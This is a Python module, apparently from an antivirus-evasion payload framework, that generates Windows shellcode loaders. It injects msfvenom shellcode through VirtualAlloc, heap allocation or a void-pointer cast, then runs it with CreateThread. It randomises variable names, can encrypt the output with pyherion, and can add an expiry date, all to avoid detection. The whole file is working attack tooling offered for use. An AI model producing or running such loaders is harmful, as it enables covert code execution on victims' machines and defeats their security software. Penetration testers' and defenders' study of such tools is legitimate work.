"""

Inline shellcode injection.

Uses VirtualAlloc() to allocate space for shellcode, RtlMoveMemory() to
copy the shellcode in, then calls CreateThread() to invoke.

Inspiration from http://www.debasish.in/2012/04/execute-shellcode-using-python.html

 - or -

Very basic void pointer reference, similar to the c payload


module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:

    def __init__(self):
        # required options
        self.description = "No obfuscation, basic injection of shellcode through virtualalloc or void pointer reference."
        self.language = "python"
        self.rating = "Normal"
        self.extension = "py"

        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
                                    "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"]
                                }

    def generate(self):
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()

                # Create Payload code
                PayloadCode = 'import ctypes as avlol\n'
                PayloadCode += ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
                PayloadCode += RandPtr + ' = avlol.windll.kernel32.VirtualAlloc(avlol.c_int(0),avlol.c_int(len('+ ShellcodeVariableName +')),avlol.c_int(0x3000),avlol.c_int(0x40))\n'
                PayloadCode += RandBuf + ' = (avlol.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                PayloadCode += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode
            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                # Create Payload code
                PayloadCode = 'import ctypes as avlol\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
                PayloadCode += '\t' + RandPtr + ' = avlol.windll.kernel32.VirtualAlloc(avlol.c_int(0),avlol.c_int(len('+ ShellcodeVariableName +')),avlol.c_int(0x3000),avlol.c_int(0x40))\n'
                PayloadCode += '\t' + RandBuf + ' = (avlol.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tavlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                PayloadCode += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        if self.required_options["INJECT_METHOD"][0].lower() == "heap":
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                HeapVar = helpers.randomString()

                # Create Payload code
                PayloadCode = 'import ctypes as avlol\n'
                PayloadCode += ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
                PayloadCode += HeapVar + ' = avlol.windll.kernel32.HeapCreate(avlol.c_int(0x00040000),avlol.c_int(len(' + ShellcodeVariableName + ') * 2),avlol.c_int(0))\n'
                PayloadCode += RandPtr + ' = avlol.windll.kernel32.HeapAlloc(avlol.c_int(' + HeapVar + '),avlol.c_int(0x00000008),avlol.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandBuf + ' = (avlol.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'avlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                PayloadCode += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                HeapVar = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                # Create Payload code
                PayloadCode = 'import ctypes as avlol\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
                PayloadCode += '\t' + HeapVar + ' = avlol.windll.kernel32.HeapCreate(avlol.c_int(0x00040000),avlol.c_int(len(' + ShellcodeVariableName + ') * 2),avlol.c_int(0))\n'
                PayloadCode += '\t' + RandPtr + ' = avlol.windll.kernel32.HeapAlloc(avlol.c_int(' + HeapVar + '),avlol.c_int(0x00000008),avlol.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandBuf + ' = (avlol.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tavlol.windll.kernel32.RtlMoveMemory(avlol.c_int(' + RandPtr + '),' + RandBuf + ',avlol.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + RandPtr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                PayloadCode += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + RandHt + '),avlol.c_int(-1))\n'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        else:
            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()

                PayloadCode = 'from ctypes import *\n'
                PayloadCode += RandReverseShell + ' = \"' + Shellcode + '\"\n'
                PayloadCode += RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n'
                PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += RandShellcode + '()'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:
                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate(self.required_options)

                # Generate Random Variable Names
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandReverseShell + ' = \"' + Shellcode + '\"\n'
                PayloadCode += '\t' + RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n'
                PayloadCode += '\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t' + RandShellcode + '()'

                if self.required_options["USE_PYHERION"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

